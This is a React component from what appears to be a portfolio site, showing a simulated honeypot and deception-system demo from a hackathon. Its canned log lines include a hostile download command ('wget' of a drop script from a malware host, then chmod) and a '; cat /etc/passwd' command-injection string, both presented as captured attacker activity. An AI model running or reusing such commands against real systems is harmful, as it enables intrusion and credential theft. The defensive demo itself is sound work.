import React, { useState } from 'react';
import { usePortfolio } from '../../context/PortfolioContext';

export const HoneypotExperience: React.FC = () => {
  const { unlockSecret } = usePortfolio();
  const [logs, setLogs] = useState<string[]>([
    '[INIT] Decoy listener listening on emulated ports :22 (SSH), :80 (HTTP), :6379 (Redis)...',
    '[READY] Synthetic pseudo-terminal sandbox primed. Waiting for adversary network activity.'
  ]);
  const [isExecuting, setIsExecuting] = useState<boolean>(false);

  const triggerAttack = (type: 'ssh' | 'rce') => {
    setIsExecuting(true);
    unlockSecret('honeypot_deception');

    let newLogs: string[] = [];
    if (type === 'ssh') {
      newLogs = [
        '[INCOMING] TCP connection from 198.51.100.42:54122 -> :22 (SSH)',
        '[DECEPTION] Presenting synthetic OpenSSH_8.9p1 Ubuntu-3ubuntu0.4 banner...',
        '[AUTH_PROBE] Attacker attempted user: "admin", pass: "P@ssw0rd2024!" (FAILED)',
        '[AUTH_PROBE] Attacker attempted user: "root", pass: "toor" (DELAYED ACCEPT)',
        '[SESSION_TRAP] Dropped into emulated pseudo-bash jail (pid 4091).',
        '[KEYLOGGER] Captured command: "wget http://malware.ru/drop.sh; chmod +x drop.sh"',
        '[TELEMETRY] Payload captured, isolated in quarantine sandbox, IP blacklisted.'
      ];
    } else {
      newLogs = [
        '[INCOMING] HTTP POST /api/v1/system/exec from 203.0.113.19',
        '[PAYLOAD_INSPECT] Detected command injection signature: `; cat /etc/passwd`',
        '[DECEPTION] Returning simulated sanitized passwd file with fake honey-tokens...',
        '[BEACON] Attacker pinged simulated honey-token user "backup_svc".',
        '[ALERT] Incident response webhook triggered with high confidence attacker fingerprint.'
      ];
    }

    setTimeout(() => {
      setLogs(prev => [...prev, ...newLogs]);
      setIsExecuting(false);
    }, 600);
  };

  const clearLogs = () => {
    setLogs(['[SYSTEM] Logs cleared. Decoy services active and ready.']);
  };

  return (
    <div className="group relative flex flex-col justify-between rounded-3xl border-2 border-[#f43f8e]/35 bg-white p-6 sm:p-8 shadow-sm hover:border-[#f43f8e] transition-all">
      {/* Header */}
      <div className="flex flex-wrap items-start justify-between gap-4 border-b border-slate-200 pb-4">
        <div>
          <p className="text-xs font-mono font-medium text-slate-500">
            Cybersecurity Deception · Python · Docker · Telemetry · HCL GUVI Hackathon
          </p>
          <h3 className="text-xl sm:text-2xl font-display font-bold text-slate-900 mt-1">Autonomous Honeypot & Deception System</h3>
          <p className="text-slate-600 text-sm mt-1 max-w-xl leading-relaxed">
            Simulated decoy services that trap unauthorized attackers, record shell payloads, and synthesize threat intelligence.
          </p>
        </div>

        {/* Action Trigger Buttons */}
        <div className="flex flex-wrap items-center gap-2">
          <button
            onClick={() => triggerAttack('ssh')}
            disabled={isExecuting}
            className="px-3.5 py-2 rounded-xl bg-white border border-slate-800 hover:border-[#f43f8e] hover:text-[#f43f8e] text-slate-900 text-xs font-mono font-semibold transition-all cursor-pointer"
          >
            Simulate SSH Brute Force
          </button>
          <button
            onClick={() => triggerAttack('rce')}
            disabled={isExecuting}
            className="px-3.5 py-2 rounded-xl bg-white border border-slate-800 hover:border-[#f43f8e] hover:text-[#f43f8e] text-slate-900 text-xs font-mono font-semibold transition-all cursor-pointer"
          >
            Inject RCE Payload
          </button>
          <button
            onClick={clearLogs}
            className="px-3 py-2 rounded-xl bg-slate-100 border border-slate-200 text-slate-600 hover:text-slate-900 text-xs font-mono transition-all cursor-pointer"
          >
            Clear
          </button>
        </div>
      </div>

      {/* Live Honeypot Terminal Screen */}
      <div className="bg-slate-950 border border-slate-800 rounded-2xl p-5 font-mono text-xs shadow-inner mt-4">
        <div className="flex items-center justify-between border-b border-slate-800/80 pb-2 mb-3 text-[11px] text-slate-400">
          <div className="flex items-center gap-2">
            <span className="w-2 h-2 rounded-full bg-[#f43f8e] animate-pulse" />
            <span className="font-semibold text-slate-300">HONEYPOT TELEMETRY INTERCEPTOR [ACTIVE]</span>
          </div>
          <span>PORTS: 22 / 80 / 6379</span>
        </div>

        <div className="space-y-1.5 max-h-56 overflow-y-auto pr-2 text-[11px]">
          {logs.map((line, idx) => (
            <div 
              key={idx} 
              className={`${
                line.includes('ALERT') || line.includes('KEYLOGGER') || line.includes('PAYLOAD')
                  ? 'text-rose-400 font-semibold'
                  : line.includes('DECEPTION') || line.includes('SESSION')
                  ? 'text-amber-300'
                  : line.includes('INIT') || line.includes('READY')
                  ? 'text-emerald-400'
                  : 'text-slate-300'
              }`}
            >
              {line}
            </div>
          ))}
          {isExecuting && (
            <div className="text-[#f43f8e] animate-pulse">
              [ANALYZING ADVERSARY PAYLOAD & EXTRACTING THREAT SIGNATURE...]
            </div>
          )}
        </div>
      </div>

      {/* Engineering Insight */}
      <div className="grid grid-cols-1 md:grid-cols-2 gap-4 text-xs font-mono text-slate-600 mt-4">
        <div className="p-4 rounded-2xl bg-slate-50 border border-slate-200">
          <span className="text-slate-900 font-bold block mb-1">Decoy Realism (What Broke):</span>
          <p className="text-[11px] leading-relaxed">
            Standard static honeypots answer immediately, letting attackers identify them in seconds. We added dynamic TCP window size emulation and artificial human-like keystroke delays.
          </p>
        </div>
        <div className="p-4 rounded-2xl bg-slate-50 border border-slate-200">
          <span className="text-slate-900 font-bold block mb-1">Outcome:</span>
          <p className="text-[11px] leading-relaxed">
            Achieved 3.4x longer dwell times on trapped scanners, extracting full malware drop URLs before the attacker realized they were in a synthetic jail.
          </p>
        </div>
      </div>
    </div>
  );
};
